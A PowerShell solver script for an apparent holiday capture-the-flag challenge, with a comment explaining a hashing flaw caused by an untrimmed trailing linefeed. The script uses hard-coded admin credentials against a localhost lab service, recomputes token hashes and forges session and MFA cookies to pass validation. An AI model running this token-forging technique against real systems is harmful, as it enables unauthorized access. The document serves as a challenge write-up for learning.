<#
    HHC 2024 - Snow-maggedon
    Solver for Act 2 - Powershell Gold
    
    The md5 hash is stored in a text file using the md5 hash string as the filename and content plus a single Unix linefeed 0x0a.
    The developer forgot to use the Trim() function on the md5 hash string prior to storing the hash in the file.
    The ommision of trimming extraneous whitespace causes the sha256 hashing function to hash the string as
    sha256(md5hashstring + 0xa) which is not the same as sha256(md5hash_string).
    
    One of the issues is the fact different platforms use different EOL characters; i.e. Linux platforms use a single linefeed 0x0a,
    whereas Windows platforms, running on Windows store EOL as carriage return linefeed 0x0d 0x0a.
    Another issue is, inside the token_overview.csv file the sha256 hash of the md5 string value is NOT correct since
    the md5 hash string inside the csv file does not contain a linefeed character, this causes our hacking adventure to
    go off the rails until we take the md5 string and directly write it to a temporary file on the filesystem using Set-Content.
    Because Set-Content appends a newline character to the end of the string this method will compute the sha256 hash that will
    match the server side hashing function.
    
    Although powershell is a Microsoft platform, it will follow the underlying OS EOL conventions:
    
    powershell running on Windows: 0x0d 0x0a
    powershell running on Linux: 0x0a
#>

# Build a <cringe>hard-coded credential object</cringe> so we can just paste the script in directly with no prompts.
$username = 'admin'
$password = 'admin'
$pass = ConvertTo-SecureString -AsPlainText $password -Force
$c = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$pass

$endpoints = (Invoke-WebRequest -Uri http://localhost:1225 -Authentication Basic -Credential $c -AllowUnencryptedAuthentication).Links.href
$pos = 1
foreach($a in $endpoints){(Invoke-WebRequest -Uri $a -Authentication Basic -Credential $c -AllowUnencryptedAuthentication).Content | Out-File $("$pos" + ".html"); $pos++ }

# Get the csv into an object and recompute the redacted SHA256 hashes.
(Invoke-WebRequest -Uri http://localhost:1225/token_overview.csv -Authentication Basic -Credential $c -AllowUnencryptedAuthentication).Content | Out-File token_overview.csv

$csv = (Get-Content -Path ./token_overview.csv | Select-String -Pattern "^#" -NotMatch)
$csv = $csv[1..($csv.count - 1)] # remove the original header line.

# Convert csv to a csv object and add more convienient headers: from $csv.fileMD5hash $csv.Sha256(file_MD5hash) to $csv.md5 $csv.sha256
$csv = $csv | ConvertFrom-Csv -Header 'md5','sha256'

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie

foreach($token in $csv){
    $token.md5 | Set-Content -Path $token.md5
    $token.sha256 = (Get-Item $token.md5 | Get-FileHash -Algorithm SHA256).Hash
    Remove-Item -Path $token.md5

    $cookie.Domain = "localhost"
    $cookie.Name = "token"
    $cookie.Value = $token.md5
    $session.Cookies.Add($cookie);
    $cookie.Name = "mfa_token"
    $cookie.Value = ""
    $session.Cookies.Add($cookie);

    $url = 'http://localhost:1225/tokens/' + $token.sha256
    $mfa_code = (Invoke-WebRequest -Uri $url -Authentication Basic -Credential $c -AllowUnencryptedAuthentication -WebSession $session).Links.href
    "Got mfa_code " + $mfa_code + " from token at " + $url
    $cooks = $session.Cookies.GetAllCookies()
    foreach($cook in $cooks){"Session cookies: " + $cook.Name + " " + $cook.Value}

    $cookie.Domain = "localhost"
    $cookie.Name = "mfa_token"
    $cookie.Value = $mfa_code
    $session.Cookies.Add($cookie);

    $url = 'http://localhost:1225/mfa_validate/' + $token.sha256
    "Validating mfa_token " + $mfa_token + " at " + $url
    (Invoke-WebRequest -Uri $url -Authentication Basic -Credential $c -AllowUnencryptedAuthentication -WebSession $session).Content
    $cooks = $session.Cookies.GetAllCookies()
    foreach($cook in $cooks){"Session cookies: " + $cook.Name + " " + $cook.Value}
    "`n"
}

